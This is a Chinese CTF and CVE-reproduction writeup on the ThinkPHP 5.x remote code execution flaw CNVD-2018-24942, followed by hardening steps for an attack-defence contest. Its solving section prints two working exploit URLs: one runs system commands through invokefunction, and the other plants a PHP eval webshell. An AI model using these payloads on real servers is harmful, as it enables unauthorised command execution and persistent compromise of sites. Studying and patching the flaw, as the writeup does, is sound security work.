---
title: ThinkPHP CNVD-2018-24942
date: '2026-10-22 22:40:38'
tags: []
categories:
  - CTF-Writeups
  - CVE复现
slug: ThinkPHP CNVD-2018-24942
permalink: /thinkphp-cnvd-2018-24942
draft: false
---

## 1、漏洞描述
CNVD-2018-24942 是 ThinkPHP 5.x 框架的一个高危远程代码执行漏洞。其核心问题在于框架对 URL 中的控制器名过滤不严，导致攻击者能够通过构造恶意请求，在无需授权的情况下远程执行系统命令。
## 2、🎯 漏洞发生条件
- **特定版本**：主要影响 **ThinkPHP 5.0.x（≤5.0.23）** 和 **5.1.x（<5.1.31）** 版本。
- **路由未加固**：**未开启强制路由**（即处于默认或未配置状态），这是漏洞能够被利用的关键前提。
- **调试模式影响**：部分特定版本（如 5.0.13~5.0.19 及 5.0.21~5.0.23）需要 **`app_debug` 开启（Debug模式）** 才能触发；而 5.0.8~5.0.12 等版本则无需开启即可被攻击。
- 影响范围

| 版本名    | 是否可被攻击 | 攻击条件      |
| ------ | ------ | --------- |
| 5.0.0  | 否      | 无         |
| 5.0.1  | 否      | 无         |
| 5.0.2  | 否      | 无         |
| 5.0.3  | 否      | 无         |
| 5.0.4  | 否      | 无         |
| 5.0.5  | 否      | 无         |
| 5.0.6  | 否      | 无         |
| 5.0.7  | 否      | 无         |
| 5.0.8  | 是      | 无需开启debug |
| 5.0.9  | 是      | 无需开启debug |
| 5.0.10 | 是      | 无需开启debug |
| 5.0.11 | 是      | 无需开启debug |
| 5.0.12 | 是      | 无需开启debug |
| 5.0.13 | 是      | 需开启debug  |
| 5.0.14 | 是      | 需开启debug  |
| 5.0.15 | 是      | 需开启debug  |
| 5.0.16 | 是      | 需开启debug  |
| 5.0.17 | 是      | 需开启debug  |
| 5.0.18 | 是      | 需开启debug  |
| 5.0.19 | 是      | 需开启debug  |
| 5.0.20 | 否      | 无         |
| 5.0.21 | 是      | 需开启debug  |
| 5.0.22 | 是      | 需开启debug  |
| 5.0.23 | 是      | 需开启debug  |
## 3、解题
只要发现站点是**ThinkPHP 5.0.x（≤5.0.23）** 和 **5.1.x（<5.1.31）** 版本，就可以使用以下两种解法
### 3.1 法一
通过构造特殊的 URL 路径，让框架实例化 `think\app` 类并调用其 `invokefunction` 方法，最终通过 `call_user_func_array` 执行系统命令。
```http
/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name flag* # find / -name flag*可以换成想用的命令
```
### 3.2 法二
```http
/index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20@eval(\$_POST[pass])?%3E
```
写入Webshell，访问`http://XXXXX:XXXX/shell.php`
再使用POST传入`pass=system('find / -name flag*');`也可以。
## 4、安全加固
### 📦 第一步：备份（必须先做）

任何修改前先备份，AWD 中一旦改错可快速恢复。
```bash
cd /var/www/html  # 按实际路径调整
tar -zcvf /tmp/web_backup_$(date +%s).tar.gz ./
```
### 🛡️ 第二步：入口文件拦截（最快止血）

找到 ThinkPHP 的入口文件，通常在 `public/index.php`。在 `<?php` 之后**顶部**插入拦截代码：
```bash
# 先确认入口文件位置
find /var/www/html -name "index.php" -path "*/public/*" 2>/dev/null
```
然后用 `sed` 或 `vim` 在文件顶部插入。以 `vim` 为例：
```bash
vim /var/www/html/public/index.php
```
在 `<?php` 后加入：
```php
// AWD 紧急拦截 ThinkPHP RCE
$requestUri = $_SERVER['REQUEST_URI'] ?? '';
if (stripos($requestUri, '\\') !== false || stripos($requestUri, '_method=__construct') !== false) {
    http_response_code(403);
    die('Forbidden');
}
```
保存退出。此操作立即生效，不影响正常业务。
### ⚙️ 第三步：修改框架配置（根除漏洞）

定位 ThinkPHP 的配置文件目录，通常是 `config/`：
```bash
cd /var/www/html
find . -maxdepth 3 -type d -name "config" 2>/dev/null
```
**3.1 关闭调试模式**

编辑 `config/app.php`，确保以下配置：
```bash
# 用 sed 批量修改（谨慎，建议先 cat 确认原值）
sed -i "s/'app_debug'\s*=>\s*true/'app_debug' => false/" config/app.php
sed -i "s/'app_trace'\s*=>\s*true/'app_trace' => false/" config/app.php
sed -i "s/'remote_debug'\s*=>\s*true/'remote_debug' => false/" config/app.php
```
**3.2 禁用自动路由（关键）**
编辑 `config/app.php`：
```bash
sed -i "s/'auto_route'\s*=>\s*true/'auto_route' => false/" config/app.php
```
**3.3 强制路由匹配（最彻底）**
编辑 `config/route.php`，加入或修改：
```bash
# 如果文件存在
echo "'url_route_must' => true," >> config/route.php
```
> 注意：`url_route_must => true` 会要求所有请求必须匹配已定义路由。如果业务有未定义路由的动态访问，可能导致 404，需权衡使用。

**3.4 清空 runtime 缓存**
攻击者可能已通过漏洞写入缓存文件：
```bash
rm -rf /var/www/html/runtime/cache/*
rm -rf /var/www/html/runtime/log/*
rm -rf /var/www/html/runtime/temp/*
```
